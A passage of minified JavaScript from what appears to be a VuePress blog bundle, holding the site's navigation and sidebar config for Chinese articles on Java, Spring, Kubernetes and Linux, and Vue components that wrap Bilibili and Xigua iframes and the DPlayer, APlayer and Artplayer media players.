Plus",link:"/mybatis/mybatis-plus/300/"}]}]},{text:"运维",items:[{text:"linux",link:"/linux/2300/"},{text:"Docker",link:"/docker/400/"},{text:"Jenkins",link:"/jenkins/500/"},{text:"Kubernetes",link:"/kubernetes/600/"}]},{text:"大数据",items:[{text:"Hadoop",link:"/hadoop/700/"},{text:"ClickHouse",link:"/clickhouse/800/"},{text:"Hbase",link:"/hbase/900/"},{text:"Hive",link:"/hive/1000/"},{text:"Flume",link:"/flume/1100/"},{text:"Flink",link:"/flink/1200/"}]},{text:"数据库",items:[{text:"MySQL",link:"/mysql/1300/"},{text:"MongoDB",link:"/mongodb/1800/"}]},{text:"中间件",items:[{text:"KAFKA",link:"/kafka/1400/"},{text:"RabbitMQ",link:"/rabbitmq/1500/"},{text:"Redis",link:"/redis/1600/"},{text:"Nginx",link:"/nginx/1700/"}]},{text:"前端",items:[{text:"VUE3",link:"/vue3/1900/"},{text:"微信小程序",link:"/wx/2000/"}]}],sidebarDepth:2,logo:"/assets/img/logo.png",repo:"landashu?tab=repositories",searchMaxSuggestions:10,lastUpdated:"上次更新",docsDir:"docs",editLinks:!1,editLinkText:"编辑",pageStyle:"line",category:!1,tag:!1,archive:!1,sidebarOpen:!0,sidebar:{"/00.java/":[{title:"java",collapsable:!1,children:[["10.java/100.java.md","JVM","/java/100/"],["10.java/101.打包exe程序.md","jar 打包成.exe可执行文件","/java/101/"],["10.java/102.java代码混淆之ProGuard.md","java代码混淆之 ProGuard","/java/102/"]]},{title:"Spring",collapsable:!1,children:[{title:"spring",collapsable:!1,children:[["20.Spring/21.spring/200.核心内容拆解 IOC.md","核心内容拆解 IOC","/spring/spring/200/"],["20.Spring/21.spring/201.核心内容拆解 AOP.md","核心内容拆解 AOP","/spring/spring/201/"],["20.Spring/21.spring/202.核心内容拆解 事件通知.md","核心内容拆解 事件通知","/spring/spring/202/"],["20.Spring/21.spring/203.核心内容拆解 三级缓存.md","核心内容拆解 三级缓存","/spring/spring/203/"],["20.Spring/21.spring/204.核心内容拆解 FactoryBean.md","核心内容拆解 FactoryBean","/spring/spring/204/"],["20.Spring/21.spring/205.注解替代Spring生命周期实现类.md","注解替代Spring生命周期实现类","/spring/spring/205/"]]},{title:"spring mv",collapsable:!1,children:[["20.Spring/22.spring mv/200.Spring MVC 之工作原理.md","Spring MVC 之基本工作原理","/spring/spring-mvc/200/"]]},{title:"springboot",collapsable:!1,children:[["20.Spring/23.springboot/200.SpringBoot 之 Filter、Interceptor、Aspect.md","SpringBoot 之 Filter、Interceptor、Aspect","/spring/spring-boot/200/"],["20.Spring/23.springboot/201.SpringBoot 之 Starter.md","SpringBoot 之 Starter","/spring/spring-boot/201/"],["20.Spring/23.springboot/202.SpringBoot 之 Stomp 使用和 vue 相配置.md","SpringBoot 之 Stomp 使用和 vue 相配置","/spring/spring-boot/202/"],["20.Spring/23.springboot/203.SpringBoot MyBatisPlus 实现多数据源.md","SpringBoot MyBatisPlus 实现多数据源","/spring/spring-boot/203/"],["20.Spring/23.springboot/204.SpringBoot MyBatis 动态建表.md","SpringBoot MyBatis 动态建表","/spring/spring-boot/204/"],["20.Spring/23.springboot/205.Spring Boot 集成 Jasypt 3.0.3 配置文件加密.md","Spring Boot 集成 Jasypt 3.0.3 配置文件加密","/spring/spring-boot/205/"],["20.Spring/23.springboot/206.Spring Boot 集成 FastDFS.md","Spring Boot 集成 FastDFS","/spring/spring-boot/206/"],["20.Spring/23.springboot/207.Spring Boot VUE前后端加解密.md","Spring Boot VUE前后端加解密","/spring/spring-boot/207/"]]}]},{title:"Mybatis",collapsable:!1,children:[{title:"mybatis",collapsable:!1,children:[["30.Mybatis/31.mybatis/300.核心功能拆解 工作流程.md","核心功能拆解 工作流程","/mybatis/mybatis/300/"],["30.Mybatis/31.mybatis/301.核心功能拆解 Plugin插件功能实现.md","核心功能拆解 Plugin插件功能实现","/mybatis/mybatis/301/"],["30.Mybatis/31.mybatis/302.核心功能拆解 一二级缓存原理.md","核心功能拆解 一二级缓存原理","/mybatis/mybatis/302/"],["30.Mybatis/31.mybatis/303.MyBatis Plus+Spring Boot 实现一二级缓存以及自定义缓存.md","MyBatis Plus+Spring Boot 实现一二级缓存以及自定义缓存","/mybatis/mybatis/303/"]]}]},{title:"maven",collapsable:!1,children:[["2300.maven/2300.pom 文件介绍及 parent、properties 标签详解.md","pom 文件介绍及 parent、properties 标签详解","/maven/2300/"],["2300.maven/2301.dependencies 标签详解.md","dependencies 标签详解","/maven/2301/"],["2300.maven/2302.使用 Nexus3.x 搭建私服.md","使用 Nexus3.x 搭建私服","/maven/2302/"]]}],catalogue:{},"/01.运维/":[{title:"Docker",collapsable:!1,children:[["40.Docker/400.Docker 概念、命令及Dockerfile介绍.md","Docker 概念、命令及Dockerfile介绍","/docker/400"],["40.Docker/401.Docker-Compose 命令及基本使用.md","Docker-Compose 命令及基本使用","/docker/401"],["40.Docker/402.Docker私有库的开发.md","Docker私有库的开发","/docker/402"]]},{title:"Jenkins",collapsable:!1,children:[["50.Jenkins/500.Jenkins(一) 持续集成及Jenkins介绍.md","Jenkins(一) 持续集成及Jenkins介绍","/jenkins/500"],["50.Jenkins/501.Jenkins(二) Jenkins安装和环境配置.md","Jenkins(二) Jenkins安装和环境配置","/jenkins/501"],["50.Jenkins/502.Jenkins(三) Jenkins用户管理及凭证.md","Jenkins(三) Jenkins用户管理及凭证","/jenkins/502"],["50.Jenkins/503.Jenkins(四) Maven安装和配置.md","Jenkins(四) Maven安装和配置","/jenkins/503"],["50.Jenkins/504.Jenkins(五) Jenkins构建Maven项目.md","Jenkins(五) Jenkins构建Maven项目","/jenkins/504"],["50.Jenkins/505.Jenkins(六) Jenkins项目构建细节.md","Jenkins(六) Jenkins项目构建细节","/jenkins/505"],["50.Jenkins/506.Jenkins(七) Jenkins+Docker+SpringCloud微服务持续集成（上）.md","Jenkins(七) Jenkins+Docker+SpringCloud微服务持续集成（上）","/jenkins/506"],["50.Jenkins/507.Jenkins(八) Jenkins+Docker+SpringCloud微服务持续集成（下）.md","Jenkins(八) Jenkins+Docker+SpringCloud微服务持续集成（下）","/jenkins/507"]]},{title:"Kubernetes",collapsable:!1,children:[["60.Kubernetes/600.kubernetes(一) 概念及介绍.md","kubernetes(一) 概念及介绍","/kubernetes/600"],["60.Kubernetes/601.kubernetes(二) 集群环境搭建.md","kubernetes(二) 集群环境搭建","/kubernetes/601"],["60.Kubernetes/602.kubernetes(三) 资源管理.md","kubernetes(三) 资源管理","/kubernetes/602"],["60.Kubernetes/603.kubernetes(四) Namespace、Pod、Lable、Deployment、Service 的资源介绍.md","kubernetes(四) Namespace、Pod、Lable、Deployment、Service 的资源介绍","/kubernetes/603"],["60.Kubernetes/604.kubernetes(五) Pod 介绍及配置.md","kubernetes(五) Pod 介绍及配置","/kubernetes/604"],["60.Kubernetes/605.kubernetes(六) Pod 生命周期.md","kubernetes(六) Pod 生命周期","/kubernetes/605"],["60.Kubernetes/606.kubernetes(七) Pod 调度.md","kubernetes(七) Pod 调度","/kubernetes/606"],["60.Kubernetes/607.kubernetes(八) Pod 控制器详解.md","kubernetes(八) Pod 控制器详解","/kubernetes/607"],["60.Kubernetes/608.kubernetes(九) Service介绍、类型及使用.md","kubernetes(九) Service介绍、类型及使用","/kubernetes/608"],["60.Kubernetes/609.kubernetes(十) Ingress介绍及使用.md","kubernetes(十) Ingress介绍及使用","/kubernetes/609"],["60.Kubernetes/610.kubernetes(十一) 数据存储（挂载卷管理）.md","kubernetes(十一) 数据存储（挂载卷管理）","/kubernetes/610"],["60.Kubernetes/611.kubernetes(十二) 安全认证.md","kubernetes(十二) 安全认证","/kubernetes/611"],["60.Kubernetes/612.kubernetes(十三) DashBoard.md","kubernetes(十三) DashBoard","/kubernetes/612"]]},{title:"linux",collapsable:!1,children:[["2300.linux/2300.Linux 创建用户及权限操作.md","linux 创建用户及权限操作","/linux/2300"],["2300.linux/2301.Linux 磁盘操作相关命令.md","Linux 磁盘操作相关命令","/linux/2301"],["2300.linux/2302.Linux 文本数据处理工具awk命令.md","Linux 文本数据处理工具awk命令","/linux/2302"],["2300.linux/2303.Linux 定时任务.md","Linux 定时任务","/linux/2303"],["2300.linux/2304.Linux 命令总结.md","Linux 命令总结","/linux/2304"],["2300.linux/2305.Linux 22端口对外攻击解决.md","Linux 22端口对外攻击解决","/linux/2305"]]}]},extendFrontmatter:{article:!1},updateBar:{showToArticle:!1,moreArticle:"/archives"},social:{icons:[{iconClass:"icon-gitee",title:"gitee",link:"https://gitee.com/dashboard"},{iconClass:"icon-github",title:"GitHub",link:"https://github.com/landashu?tab=repositories"},{iconClass:"icon-youjian",title:"发邮件",link:"mailto:875730567@qq.com"}]},footer:{createYear:2023,copyrightInfo:"\n\x3c!--      <a href='https://doc.xugaoyi.com/' target='_blank'>Theme by Vdoing</a> | <a href='http://doc.aizuda.com/' rel='external nofollow' target='_blank'>Copyright © 2022-2023 AiZuDa</a>--\x3e\n\x3c!--      <br>--\x3e\n\x3c!--      <a href=\"http://beian.miit.gov.cn/\" target=\"_blank\">鲁ICP备2021041554号-1</a>--\x3e\n    "}}},Ys=(t(116),t(213),t(111),t(223)),Xs=t(224),Qs=(t(377),t(158),t(52));var Zs={computed:{$filterPosts:function(){return this.$site.pages.filter((function(n){var e=n.frontmatter,t=e.pageComponent,r=e.article,o=e.home;return!(t||!1===r||!0===o)}))},$sortPosts:function(){return(n=this.$filterPosts).sort((function(n,e){var t=n.frontmatter.sticky,r=e.frontmatter.sticky;return t&&r?t==r?Object(Qs.a)(n,e):t-r:t&&!r?-1:!t&&r?1:Object(Qs.a)(n,e)})),n;var n},$sortPostsByDate:function(){return(n=this.$filterPosts).sort((function(n,e){return Object(Qs.a)(n,e)})),n;var n},$groupPosts:function(){return function(n){for(var e={},t={},r=function(r,o){var a=n[r].frontmatter,i=a.categories,s=a.tags;"array"===Object(Qs.n)(i)&&i.forEach((function(t){t&&(e[t]||(e[t]=[]),e[t].push(n[r]))})),"array"===Object(Qs.n)(s)&&s.forEach((function(e){e&&(t[e]||(t[e]=[]),t[e].push(n[r]))}))},o=0,a=n.length;o<a;o++)r(o);return{categories:e,tags:t}}(this.$sortPosts)},$categoriesAndTags:function(){return function(n){var e=[],t=[];for(var r in n.categories)e.push({key:r,length:n.categories[r].length});for(var o in n.tags)t.push({key:o,length:n.tags[o].length});return{categories:e,tags:t}}(this.$groupPosts)}}};Ro.component(Ys.default),Ro.component(Xs.default);function nc(n){return n.toString().padStart(2,"0")}t(381);Ro.component("Badge",(function(){return Promise.all([t.e(1),t.e(12)]).then(t.bind(null,547))})),Ro.component("CodeBlock",(function(){return Promise.resolve().then(t.bind(null,223))})),Ro.component("CodeGroup",(function(){return Promise.resolve().then(t.bind(null,224))}));t(382);var ec=Ro.extend({props:{bvid:{type:String,default:{page:1,danmaku:!0,allowfullscreen:"allowfullscreen",sandbox:"allow-top-navigation allow-same-origin allow-forms allow-scripts allow-popups",width:"100%",height:[.5625,70]}.bvid,required:!0},danmaku:{type:Boolean,default:!0,required:!1},page:{type:Number,default:1,required:!1},sandbox:{type:String,default:"allow-top-navigation allow-same-origin allow-forms allow-scripts allow-popups",required:!1},allowfullscreen:{type:[String,Boolean],default:"allowfullscreen",required:!1},width:{type:String,default:"100%",required:!1},height:{type:Array,default:function(){return[.5625,70]},required:!1}},render:function(){var n=arguments[0];return n("div",{class:"smplayer"},[n("iframe",{ref:"sbplayer",style:"width: ".concat(this.width),attrs:{src:"//player.bilibili.com/player.html?bvid=".concat(this.bvid,"&page=").concat(this.page,"&danmaku=").concat(this.danmaku),allowfullscreen:(this.allowfullscreen,!0),scrolling:"no",frameborder:"0",sandbox:this.sandbox}})])},mounted:function(){var n=this;this.$nextTick((function(){var e=n.$refs.sbplayer;e.style.height="".concat(e.scrollWidth*n.height[0]+n.height[1],"px")}))}}),tc=Ro.extend({props:{xid:{type:String,default:null,required:!0},id:{type:String,default:null,required:!1},autoplay:{type:Boolean,default:!1,required:!1},startTime:{type:Number,default:0,required:!1},sandbox:{type:String,default:"allow-top-navigation allow-same-origin allow-forms allow-scripts allow-popups",required:!1},allowfullscreen:{type:[String,Boolean],default:"allowfullscreen",required:!1},width:{type:String,default:"100%",required:!1},height:{type:Array,default:function(){return[.5625,0]},required:!1}},render:function(){var n=arguments[0];return n("div",{class:"smplayer"},[n("iframe",{ref:"sbplayer",style:"width: ".concat(this.width),attrs:{src:"//www.ixigua.com/iframe/".concat(this.xid,"?").concat(this.id?"id="+this.id+"&":"","autoplay=").concat(this.autoplay?1:0,"&startTime=").concat(this.startTime),allowfullscreen:(this.allowfullscreen,!0),scrolling:"no",frameborder:"0",sandbox:this.sandbox}})])},mounted:function(){var n=this;this.$nextTick((function(){var e=n.$refs.sbplayer;e.style.height="".concat(e.scrollWidth*n.height[0]+n.height[1],"px")}))}}),rc=t(23),oc=t(17),ac=(t(106),t(151),function(){function n(e){ls(this,n),Object(oc.a)(this,"src",void 0),Object(oc.a)(this,"player",void 0),e&&(this.src=e)}var e;return ds(n,[{key:"InitPlayer",value:(e=Object(r.a)(regeneratorRuntime.mark((function n(){var e=this;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:if(!this.src){n.next=4;break}return n.next=3,t.e(6).then(t.t.bind(null,475,7)).then(function(){var n=Object(r.a)(regeneratorRuntime.mark((function n(r){var o,a,i,s,c,l,p,d,u,m,f,g,b,h,v,y,k,x,w,j,S,E,A,P,C,T,I,_,B,O,R;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:if(m=r.default,f=!1,g=!1,b=!1,h=!1,v=!1,e.src.video.customType=(null===(o=e.src)||void 0===o||null===(a=o.video)||void 0===a?void 0:a.customType)||{},null!==(i=e.src)&&void 0!==i&&null!==(s=i.video)&&void 0!==s&&s.type||(null!==(y=e.src)&&void 0!==y&&null!==(k=y.video)&&void 0!==k&&k.url.toLowerCase().endsWith(".m3u8")?e.src.video.type="hls":null!==(x=e.src)&&void 0!==x&&null!==(w=x.video)&&void 0!==w&&w.url.toLowerCase().endsWith(".flv")?e.src.video.type="flv":null!==(j=e.src)&&void 0!==j&&null!==(S=j.video)&&void 0!==S&&S.url.toLowerCase().endsWith(".mpd")&&(e.src.video.type="shakaDash")),null===(c=e.src)||void 0===c||null===(l=c.video)||void 0===l||!l.type||"string"!=typeof e.src.video.type){n.next=27;break}n.t0=e.src.video.type.toLowerCase(),n.next="hls"===n.t0||"m3u8"===n.t0?12:"flv"===n.t0?15:"dash"===n.t0?18:"shakadash"===n.t0||"shaka"===n.t0||"shaka-dash"===n.t0?21:"webtorrent"===n.t0?24:27;break;case 12:return e.src.video.type="smplayerDplayerHls",f=!0,n.abrupt("break",27);case 15:return e.src.video.type="smplayerDplayerFlv",g=!0,n.abrupt("break",27);case 18:return e.src.video.type="smplayerDplayerDash",b=!0,n.abrupt("break",27);case 21:return e.src.video.type="smplayerDplayerShakaDash",h=!0,n.abrupt("break",27);case 24:return e.src.video.type="smplayerDplayerWebtorrent",v=!0,n.abrupt("break",27);case 27:if(null!=(null===(p=e.src)||void 0===p||null===(d=p.video)||void 0===d?void 0:d.quality)&&e.src.video.quality.length>0&&e.src.video.quality.forEach((function(n){if(null==n.type&&(n.url.toLowerCase().endsWith(".m3u8")?n.type="m3u8":n.url.toLowerCase().endsWith(".flv")?n.type="flv":n.url.toLowerCase().endsWith(".mpd")&&(n.type="shakaDash")),null!=n.type&&"string"==typeof n.type)switch(n.type.toLowerCase()){case"hls":case"m3u8":n.type="smplayerDplayerHls",f=!0;break;case"flv":n.type="smplayerDplayerFlv",g=!0;break;case"dash":n.type="smplayerDplayerDash",b=!0;break;case"shakadash":case"shaka":case"shaka-dash":n.type="smplayerDplayerShakaDash",h=!0;break;case"webtorrent":n.type="smplayerDplayerWebtorrent",v=!0}})),f&&Object.assign(null===(E=e.src)||void 0===E||null===(A=E.video)||void 0===A?void 0:A.customType,{smplayerDplayerHls:function(n,e){t.e(7).then(t.t.bind(null,476,7)).then((function(t){var r=t.default,o=n.src,a=new r;a.attachMedia(n),a.on(r.Events.MEDIA_ATTACHED,(function(){a.loadSource(o)})),e.on("destroy",(function(){a.destroy()}))}))}}),g&&Object.assign(null===(P=e.src)||void 0===P||null===(C=P.video)||void 0===C?void 0:C.customType,{smplayerDplayerFlv:function(n,e){t.e(8).then(t.t.bind(null,477,7)).then((function(t){var r=t.default.createPlayer({type:"flv",url:n.src});r.attachMediaElement(n),r.load(),e.on("destroy",(function(){r.destroy()}))}))}}),b&&Object.assign(null===(T=e.src)||void 0===T||null===(I=T.video)||void 0===I?void 0:I.customType,{smplayerDplayerDash:function(n,e){t.e(5).then(t.t.bind(null,478,7)).then((function(t){var r=t.default.MediaPlayer().create();r.initialize(n,n.src,!1),e.on("destroy",(function(){r.reset()}))}))}}),h&&Object.assign(null===(_=e.src)||void 0===_||null===(B=_.video)||void 0===B?void 0:B.customType,{smplayerDplayerShakaDash:function(n,e){t.e(9).then(t.t.bind(null,479,7)).then((function(t){var r=new t.default.Player(n);r.load(n.src).then((function(){e.on("destroy",(function(){r.destroy()}))}))}))}}),v&&Object.assign(null===(O=e.src)||void 0===O||null===(R=O.video)||void 0===R?void 0:R.customType,{smplayerDplayerWebtorrent:function(n,e){t.e(10).then(t.t.bind(null,480,7)).then((function(t){var r=new(0,t.default);r.add(n.src,(function(t){t.files.find((function(n){return n.name.endsWith(".mp4")})).renderTo(n),e.on("destroy",(function(){r.destroy()}))}))}))}}),null===(u=e.src)||void 0===u||!u.customInit){n.next=39;break}return n.next=36,e.src.customInit(m,e.src).then((function(n){return e.player=n,e.player}));case 36:n.t1=n.sent,n.next=40;break;case 39:n.t1=new m(e.src);case 40:return e.player=n.t1,n.abrupt("return",e.player);case 42:case"end":return n.stop()}}),n)})));return function(e){return n.apply(this,arguments)}}());case 3:return n.abrupt("return",n.sent);case 4:case"end":return n.stop()}}),n,this)}))),function(){return e.apply(this,arguments)})},{key:"DestroyPlayer",value:function(){var n;null===(n=this.player)||void 0===n||n.destroy()}},{key:"AddOnEvent",value:function(n){var e=this;n&&this.player&&Object.keys(n).forEach((function(t){e.player.on(t,(function(){return n[t](e.player,e.src)}))}))}}]),n}()),ic=t(24),sc=t.n(ic),cc=Ro.extend({props:{src:{type:Object,required:!0},on:{type:Object,default:function(){return{}},required:!1},width:{type:String,default:"100%",required:!1},height:{type:Array,default:function(){return{src:{container:null},width:"100%",on:{}}.height},required:!1}},render:function(){var n=arguments[0];return n("div",{class:"smplayer"},[n("div",{ref:"sbplayer",style:"width: ".concat(this.width)})])},data:function(){return{player:{}}},mounted:function(){var n=this;return Object(r.a)(regeneratorRuntime.mark((function e(){var t,r;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return t=sc()({},n.on),r=Object(rc.a)(Object(rc.a)({},sc()({container:null},n.src)),{},{container:n.$refs.sbplayer}),n.player=new ac(r),e.next=5,n.player.InitPlayer();case 5:n.player.AddOnEvent(t);case 6:case"end":return e.stop()}}),e)})))()},beforeDestroy:function(){var n;null===(n=this.player)||void 0===n||n.DestroyPlayer()}}),lc=(t(107),function(){function n(e){ls(this,n),Object(oc.a)(this,"src",void 0),Object(oc.a)(this,"player",void 0),e&&(this.src=e)}var e;return ds(n,[{key:"InitPlayer",value:(e=Object(r.a)(regeneratorRuntime.mark((function n(){var e=this;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:if(!this.src){n.next=4;break}return n.next=3,Promise.all([Promise.all([t.e(1),t.e(3)]).then(t.t.bind(null,481,7)),Promise.all([t.e(1),t.e(3)]).then(t.t.bind(null,482,7))]).then(function(){var n=Object(r.a)(regeneratorRuntime.mark((function n(r){var o,a,i,s,c,l,p,d;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:if(c=Object(Wi.a)(r,1),l=c[0].default,e.src.customAudioType=(null===(o=e.src)||void 0===o?void 0:o.customAudioType)||{},p=!1,null===(a=e.src)||void 0===a||null===(i=a.audio)||void 0===i||i.forEach((function(n){if(n.type||n.url.toLowerCase().endsWith(".m3u8")&&(n.type="hls"),n.type&&"string"==typeof n.type)switch(n.type.toLowerCase()){case"hls":case"m3u8":n.type="smplayerAplayerHls",p=!0}})),p&&Object.assign(null===(d=e.src)||void 0===d?void 0:d.customAudioType,{smplayerAplayerHls:function(n,e,r){t.e(7).then(t.t.bind(null,476,7)).then((function(t){var o=t.default,a=!1===r.audio.paused;if(n.canPlayType("application/x-mpegURL")||n.canPlayType("application/vnd.apple.mpegURL"))n.src=e.url;else if(o.isSupported()){var i=new o;i.attachMedia(n),i.on(o.Events.MEDIA_ATTACHED,(function(){i.loadSource(e.url)})),r.on("destroy",(function(){i.destroy()}))}else r.notice("Error: HLS is not supported.");a&&r.play()}))}}),null===(s=e.src)||void 0===s||!s.customInit){n.next=11;break}return n.next=8,e.src.customInit(l,e.src).then((function(n){return e.player=n,e.player}));case 8:n.t0=n.sent,n.next=12;break;case 11:n.t0=new l(e.src);case 12:return e.player=n.t0,n.abrupt("return",e.player);case 14:case"end":return n.stop()}}),n)})));return function(e){return n.apply(this,arguments)}}());case 3:return n.abrupt("return",n.sent);case 4:case"end":return n.stop()}}),n,this)}))),function(){return e.apply(this,arguments)})},{key:"DestroyPlayer",value:function(){var n;!this.player||null!==(n=this.src)&&void 0!==n&&n.fixed||this.player.destroy()}},{key:"AddOnEvent",value:function(n){var e=this;n&&this.player&&Object.keys(n).forEach((function(t){e.player.on(t,(function(){return n[t](e.player,e.src)}))}))}}]),n}()),pc=Ro.extend({props:{src:{type:Object,required:!0},on:{type:Object,default:function(){return{}},required:!1}},render:function(){var n=arguments[0];return n("div",{class:"smplayer"},[n("div",{ref:"sbplayer"})])},data:function(){return{player:{}}},mounted:function(){var n=this;return Object(r.a)(regeneratorRuntime.mark((function e(){var t,r;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return t=sc()({},n.on),r=Object(rc.a)(Object(rc.a)({},sc()({lrcType:3},n.src)),{},{container:n.$refs.sbplayer}),n.player=new lc(r),e.next=5,n.player.InitPlayer();case 5:n.player.AddOnEvent(t),n.$nextTick((function(){if(n.src.fixed){var e=document.querySelector("#app");null==e||e.append(n.$el)}}));case 7:case"end":return e.stop()}}),e)})))()},beforeDestroy:function(){var n;null===(n=this.player)||void 0===n||n.DestroyPlayer()}}),dc=function(){function n(e){ls(this,n),Object(oc.a)(this,"src",void 0),Object(oc.a)(this,"player",void 0),e&&(this.src=e)}var e;return ds(n,[{key:"InitPlayer",value:(e=Object(r.a)(regeneratorRuntime.mark((function n(){var e=this;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:if(!this.src){n.next=4;break}return n.next=3,t.e(4).then(t.t.bind(null,483,7)).then(function(){var n=Object(r.a)(regeneratorRuntime.mark((function n(r){var o,a,i,s,c,l,p,d,u,m,f,g,b,h,v,y,k,x,w,j,S,E;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:if(l=r.default,p=!1,d=!1,u=!1,m=!1,f=!1,e.src.customType=(null===(o=e.src)||void 0===o?void 0:o.customType)||{},null!==(a=e.src)&&void 0!==a&&a.type||(null!==(g=e.src)&&void 0!==g&&null!==(b=g.url)&&void 0!==b&&b.toLowerCase().endsWith(".m3u8")?e.src.type="hls":null!==(h=e.src)&&void 0!==h&&null!==(v=h.url)&&void 0!==v&&v.toLowerCase().endsWith(".flv")?e.src.type="flv":null!==(y=e.src)&&void 0!==y&&null!==(k=y.url)&&void 0!==k&&k.toLowerCase().endsWith(".mpd")&&(e.src.type="shakaDash")),null===(i=e.src)||void 0===i||!i.type||"string"!=typeof e.src.type){n.next=27;break}n.t0=e.src.type.toLowerCase(),n.next="hls"===n.t0||"m3u8"===n.t0?12:"flv"===n.t0?15:"dash"===n.t0?18:"shakadash"===n.t0||"shaka"===n.t0||"shaka-dash"===n.t0?21:"webtorrent"===n.t0?24:27;break;case 12:return e.src.type="smplayerArtplayerHls",p=!0,n.abrupt("break",27);case 15:return e.src.type="smplayerArtplayerFlv",d=!0,n.abrupt("break",27);case 18:return e.src.type="smplayerArtplayerDash",u=!0,n.abrupt("break",27);case 21:return e.src.type="smplayerArtplayerShakaDash",m=!0,n.abrupt("break",27);case 24:return e.src.type="smplayerArtplayerWebtorrent",f=!0,n.abrupt("break",27);case 27:if(null!=(null===(s=e.src)||void 0===s?void 0:s.quality)&&e.src.quality.length>0&&e.src.quality.forEach((function(n){if(null==n.type&&(n.url.toLowerCase().endsWith(".m3u8")?n.type="m3u8":n.url.toLowerCase().endsWith(".flv")?n.type="flv":n.url.toLowerCase().endsWith(".mpd")&&(n.type="shakaDash")),null!=n.type&&"string"==typeof n.type)switch(n.type.toLowerCase()){case"hls":case"m3u8":n.type="smplayerArtplayerHls",p=!0;break;case"flv":n.type="smplayerArtplayerFlv",d=!0;break;case"dash":n.type="smplayerArtplayerDash",u=!0;break;case"shakadash":case"shaka":case"shaka-dash":n.type="smplayerArtplayerShakaDash",m=!0;break;case"webtorrent":n.type="smplayerArtplayerWebtorrent",f=!0}})),p&&Object.assign(null===(x=e.src)||void 0===x?void 0:x.customType,{smplayerArtplayerHls:function(n,e,r){t.e(7).then(t.t.bind(null,476,7)).then((function(t){var o=t.default,a=new o;a.attachMedia(n),a.on(o.Events.MEDIA_ATTACHED,(function(){a.loadSource(e)})),r.on("destroy",(function(){a.destroy()}))}))}}),d&&Object.assign(null===(w=e.src)||void 0===w?void 0:w.customType,{smplayerArtplayerFlv:function(n,e,r){t.e(8).then(t.t.bind(null,477,7)).then((function(t){var o=t.default.createPlayer({type:"flv",url:e});o.attachMediaElement(n),o.load(),r.on("destroy",(function(){o.destroy()}))}))}}),u&&Object.assign(null===(j=e.src)||void 0===j?void 0:j.customType,{smplayerArtplayerDash:function(n,e,r){t.e(5).then(t.t.bind(null,478,7)).then((function(t){var o=t.default.MediaPlayer().create();o.initialize(n,e,!1),r.on("destroy",(function(){o.reset()}))}))}}),m&&Object.assign(null===(S=e.src)||void 0===S?void 0:S.customType,{smplayerArtplayerShakaDash:function(n,e,r){t.e(9).then(t.t.bind(null,479,7)).then((function(t){var o=new t.default.Player(n);o.load(e).then((function(){r.on("destroy",(function(){o.destroy()}))}))}))}}),f&&Object.assign(null===(E=e.src)||void 0===E?void 0:E.customType,{smplayerArtplayerWebtorrent:function(n,e,r){t.e(10).then(t.t.bind(null,480,7)).then((function(t){var o=new(0,t.default);o.add(e,(function(e){e.files.find((function(n){return n.name.endsWith(".mp4")})).renderTo(n),r.on("destroy",(function(){o.destroy()}))}))}))}}),null===(c=e.src)||void 0===c||!c.customInit){n.next=39;break}return n.next=36,e.src.customInit(l,e.src).then((function(n){return e.player=n,e.player}));case 36:n.t1=n.sent,n.next=40;break;case 39:n.t1=new l(e.src);case 40:return e.player=n.t1,n.abrupt("return",e.player);case 42:case"end":return n.stop()}}),n)})));return function(e){return n.apply(this,arguments)}}());case 3:return n.abrupt("return",n.sent);case 4:case"end":return n.stop()}}),n,this)}))),function(){return e.apply(this,arguments)})},{key:"DestroyPlayer",value:function(){var n;null===(n=this.player)||void 0===n||n.destroy()}},{key:"AddOnEvent",value:function(n){var e=this;n&&this.player&&Object.keys(n).forEach((function(t){e.player.on(t,(function(){return n[t](e.player,e.src)}))}))}}]),n}(),uc=Ro.extend({props:{src:{type:Object,required:!0},on:{type:Object,default:function(){return{}},required:!1},width:{type:String,default:"100%",required:!1},height:{type:Array,default:function(){return[.5625,0]},required:!1}},render:function(){var n=arguments[0];return n("div",{class:"smplayer"},[n("div",{ref:"sbplayer",style:"width: ".concat(this.width)})])},data:function(){return{player:{}}},mounted:function(){var n=this;return Object(r.a)(regeneratorRuntime.mark((function e(){var t,r,o;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return t=n.$refs.sbplayer,r=sc()({},n.on),o=Object(rc.a)(Object(rc.a)({},sc()({url:"",fullscreen:!0,autoSize:!0,setting:!0,playbackRate:!0,whitelist:["*"],moreVideoAttr:{preload:"auto"}},n.src)),{},{container:t}),n.player=new dc(o),e.next=6,n.player.InitPlayer();case 6:n.player.AddOnEvent(r),t.style.height=t.scrollWidth*n.height[0]+n.height[1]+"px";case 8:case"end":return e.stop()}}),e)})))()},beforeDestroy:function(){var n;null===(n=this.player)||void 0===n||n.DestroyPlayer()}});t(216);function mc(n,e){return(mc=Object.setPrototypeOf||function(n,e){return n.__proto__=e,n})(n,e)}function fc(n,e){if("function"!=typeof e&&null!==e)throw new TypeError("Super expression must either be null or a function");n.prototype=Object.create(e&&e.prototype,{constructor:{value:n,writable:!0,configurable:!0}}),Object.defineProperty(n,"prototype",{writable:!1}),e&&mc(n,e)}t(217),t(218);function gc(n){return(gc=Object.setPrototypeOf?Object.getPrototypeOf:function(n){return n.__proto__||Object.getPrototypeOf(n)})(n)}function bc(n,e){if(e&&("object"===Ai(e)||"function"==typeof e))return e;if(void 0!==e)throw new TypeError("Derived constructors may only return object or undefined");return function(n){if(void 0===n)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return n}(n)}function hc(n){var e=function(){if("undefined"==typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"==typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(n){return!1}}();return function(){var t,r=gc(n);if(e){var o=gc(this).constructor;t=Reflect.construct(r,arguments,o)}else t=r.apply(this,arguments);return bc(this,t)}}t(238),t(239);var vc=function(n){fc(o,n);var e,t=hc(o);function o(){return ls(this,o),t.call(this)}return 